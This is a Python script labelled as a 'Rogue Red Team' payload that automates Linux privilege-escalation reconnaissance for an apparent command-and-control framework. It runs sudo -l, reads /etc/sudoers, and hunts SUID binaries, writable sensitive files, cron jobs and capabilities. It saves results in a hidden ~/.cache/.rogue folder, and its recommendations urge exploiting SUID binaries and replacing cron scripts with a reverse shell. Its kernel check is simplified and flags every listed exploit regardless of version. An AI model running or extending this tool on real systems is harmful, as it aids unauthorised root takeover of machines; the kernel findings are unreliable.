#!/usr/bin/env python3
"""
PAYLOAD: Linux Privilege Escalation Automation
DESCRIPTION: Lightweight LinPEAS implementation for automated privesc checking
AUTHOR: Rogue Red Team
VERSION: 3.1
"""
import os, sys, re, subprocess, json, datetime, hashlib, stat, pwd, grp, platform, socket
import psutil, tempfile, tarfile, zipfile, fnmatch, urllib.parse, urllib.request, base64

class LinuxPrivEsc:
    def __init__(self):
        self.results = {"warnings": [], "vulnerabilities": [], "exploits": [], "configurations": []}
        self.colors = {
            "RED": "\033[91m",
            "GREEN": "\033[92m",
            "YELLOW": "\033[93m",
            "BLUE": "\033[94m",
            "RESET": "\033[0m"
        }
    
    def print_color(self, text, color):
        """Print colored output"""
        if sys.stdout.isatty():
            return f"{self.colors[color]}{text}{self.colors['RESET']}"
        return text
    
    def check_sudo_privileges(self):
        """Check sudo permissions"""
        checks = []
        try:
            # Check sudo -l
            sudo_l = subprocess.check_output("sudo -l 2>/dev/null", shell=True, stderr=subprocess.DEVNULL).decode()
            if "may run" in sudo_l:
                checks.append({
                    "type": "SUDO_PRIVS",
                    "severity": "HIGH",
                    "description": "User has sudo privileges",
                    "details": sudo_l
                })
            
            # Check sudoers file
            with open('/etc/sudoers', 'r') as f:
                sudoers = f.read()
                if "ALL=(ALL)" in sudoers:
                    checks.append({
                        "type": "SUDOERS_ALL",
                        "severity": "HIGH",
                        "description": "User in sudoers with ALL privileges"
                    })
        except:
            pass
        return checks
    
    def find_suid_binaries(self):
        """Find SUID binaries with potential privesc"""
        suid_binaries = []
        dangerous_binaries = [
            '/bin/bash', '/bin/sh', '/bin/cp', '/bin/mv', '/bin/nano',
            '/bin/vi', '/bin/vim', '/usr/bin/find', '/usr/bin/awk',
            '/usr/bin/perl', '/usr/bin/python', '/usr/bin/python3',
            '/usr/bin/ruby', '/usr/bin/lua', '/usr/bin/nmap'
        ]
        
        try:
            find_cmd = "find / -perm -4000 -type f 2>/dev/null"
            output = subprocess.check_output(find_cmd, shell=True).decode()
            
            for binary in output.strip().split('\n'):
                if binary and os.path.exists(binary):
                    binary = binary.strip()
                    dangerous = binary in dangerous_binaries
                    
                    # Check if writable
                    writable = os.access(binary, os.W_OK)
                    
                    # Check for known exploits
                    exploits = self.check_suid_exploits(binary)
                    
                    if dangerous or writable or exploits:
                        suid_binaries.append({
                            "binary": binary,
                            "dangerous": dangerous,
                            "writable": writable,
                            "exploits": exploits,
                            "owner": pwd.getpwuid(os.stat(binary).st_uid).pw_name
                        })
                        
        except Exception as e:
            suid_binaries.append({"error": str(e)})
        
        return suid_binaries
    
    def check_suid_exploits(self, binary):
        """Check for known SUID exploits"""
        exploits = []
        binary_name = os.path.basename(binary)
        
        known_exploits = {
            "nmap": ["--interactive mode escape"],
            "find": ["-exec command execution"],
            "awk": ["system() function"],
            "perl": ["-e command execution"],
            "python": ["-c command execution"],
            "ruby": ["-e command execution"],
            "bash": ["-p privilege mode"]
        }
        
        if binary_name in known_exploits:
            exploits = known_exploits[binary_name]
        
        return exploits
    
    def check_writable_files(self):
        """Find world-writable files and directories"""
        writable = []
        
        sensitive_paths = [
            '/etc/passwd', '/etc/shadow', '/etc/sudoers',
            '/etc/crontab', '/var/spool/cron',
            '/root/.ssh/authorized_keys', '/root/.bashrc',
            '/etc/init.d', '/etc/rc.local'
        ]
        
        try:
            # Check sensitive files
            for path in sensitive_paths:
                if os.path.exists(path):
                    if os.access(path, os.W_OK):
                        writable.append({
                            "path": path,
                            "type": "sensitive_file",
                            "severity": "CRITICAL"
                        })
            
            # Find world-writable directories
            find_cmd = "find / -type d -perm -0002 -not -path '/proc/*' 2>/dev/null | head -50"
            output = subprocess.check_output(find_cmd, shell=True).decode()
            
            for directory in output.strip().split('\n'):
                if directory and os.path.isdir(directory):
                    # Check if it's in PATH
                    in_path = directory in os.environ.get('PATH', '').split(':')
                    
                    writable.append({
                        "path": directory,
                        "type": "writable_directory",
                        "in_path": in_path,
                        "severity": "HIGH" if in_path else "MEDIUM"
                    })
                    
        except Exception as e:
            writable.append({"error": str(e)})
        
        return writable
    
    def check_cron_jobs(self):
        """Check cron jobs for privesc opportunities"""
        cron_vulns = []
        
        try:
            # System crontab
            if os.path.exists('/etc/crontab'):
                with open('/etc/crontab', 'r') as f:
                    for line in f:
                        if not line.strip().startswith('#') and len(line.strip()) > 0:
                            # Check for writable scripts
                            parts = line.strip().split()
                            if len(parts) >= 6:
                                script = parts[-1]
                                if os.path.exists(script) and os.access(script, os.W_OK):
                                    cron_vulns.append({
                                        "type": "WRITABLE_CRON_SCRIPT",
                                        "severity": "CRITICAL",
                                        "script": script,
                                        "line": line.strip()
                                    })
            
            # User crontabs
            cron_spool = '/var/spool/cron/crontabs/'
            if os.path.exists(cron_spool):
                for user_file in os.listdir(cron_spool):
                    user_path = os.path.join(cron_spool, user_file)
                    if os.access(user_path, os.R_OK):
                        cron_vulns.append({
                            "type": "READABLE_USER_CRONTAB",
                            "severity": "MEDIUM",
                            "user": user_file,
                            "path": user_path
                        })
            
        except Exception as e:
            cron_vulns.append({"error": str(e)})
        
        return cron_vulns
    
    def check_kernel_exploits(self):
        """Check for kernel vulnerabilities"""
        vulns = []
        
        try:
            # Get kernel version
            kernel_version = platform.release()
            
            # Check against known exploits (simplified)
            known_exploits = [
                {"name": "DirtyCow", "versions": ["2.6.22", "3.9"], "check": "cve-2016-5195"},
                {"name": "PwnKit", "versions": ["all"], "check": "pkexec"},
                {"name": "Sudo Baron Samedit", "versions": ["1.8.2", "1.9.5"], "check": "cve-2021-3156"}
            ]
            
            for exploit in known_exploits:
                vulns.append({
                    "name": exploit["name"],
                    "kernel_version": kernel_version,
                    "check": exploit["check"]
                })
                
        except Exception as e:
            vulns.append({"error": str(e)})
        
        return vulns
    
    def check_capabilities(self):
        """Check Linux capabilities"""
        caps = []
        
        try:
            # Find files with capabilities
            getcap_cmd = "getcap -r / 2>/dev/null | head -20"
            output = subprocess.check_output(getcap_cmd, shell=True).decode()
            
            dangerous_caps = ['cap_setuid', 'cap_setgid', 'cap_sys_admin', 'cap_sys_ptrace']
            
            for line in output.strip().split('\n'):
                if line:
                    parts = line.split()
                    if len(parts) >= 2:
                        file_path = parts[0]
                        file_caps = parts[1]
                        
                        # Check for dangerous capabilities
                        dangerous = any(cap in file_caps for cap in dangerous_caps)
                        
                        caps.append({
                            "file": file_path,
                            "capabilities": file_caps,
                            "dangerous": dangerous,
                            "severity": "HIGH" if dangerous else "LOW"
                        })
                        
        except Exception as e:
            caps.append({"error": str(e)})
        
        return caps
    
    def execute(self):
        """Execute all privilege escalation checks"""
        try:
            print("[+] Starting Linux privilege escalation checks...")
            
            # Run all checks
            self.results["sudo_checks"] = self.check_sudo_privileges()
            self.results["suid_binaries"] = self.find_suid_binaries()
            self.results["writable_files"] = self.check_writable_files()
            self.results["cron_vulns"] = self.check_cron_jobs()
            self.results["kernel_exploits"] = self.check_kernel_exploits()
            self.results["capabilities"] = self.check_capabilities()
            
            # Generate report
            report = {
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname(),
                "summary": {
                    "critical": len([v for v in self.results["writable_files"] if v.get("severity") == "CRITICAL"]),
                    "high": len([v for v in self.results["suid_binaries"] if v.get("dangerous")]) + 
                           len([v for v in self.results["writable_files"] if v.get("severity") == "HIGH"]),
                    "medium": len(self.results["cron_vulns"]) + 
                             len([v for v in self.results["writable_files"] if v.get("severity") == "MEDIUM"])
                },
                "recommendations": self.generate_recommendations()
            }
            
            # Save detailed results
            output_dir = os.path.expanduser("~/.cache/.rogue/privesc")
            os.makedirs(output_dir, exist_ok=True)
            
            output_file = os.path.join(output_dir, f"linpeas_{socket.gethostname()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            print(f"[+] Privilege escalation check complete. Results saved to: {output_file}")
            
            # Return summary for C2
            return json.dumps(report, indent=2)
            
        except Exception as e:
            return f"[!] Privilege escalation check failed: {str(e)}"
    
    def generate_recommendations(self):
        """Generate exploitation recommendations"""
        recs = []
        
        # Check for immediate privesc
        for suid in self.results["suid_binaries"]:
            if suid.get("dangerous") and suid.get("exploits"):
                recs.append(f"Exploit SUID binary: {suid['binary']} using: {', '.join(suid['exploits'])}")
        
        for writable in self.results["writable_files"]:
            if writable.get("severity") == "CRITICAL":
                recs.append(f"Write to sensitive file: {writable['path']}")
        
        for cron in self.results["cron_vulns"]:
            if cron.get("type") == "WRITABLE_CRON_SCRIPT":
                recs.append(f"Replace cron script: {cron['script']} with reverse shell")
        
        return recs

# === Integration with Rogue C2 ===
def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    privesc = LinuxPrivEsc()
    return privesc.execute()

if __name__ == "__main__":
    print(rogue_integration())
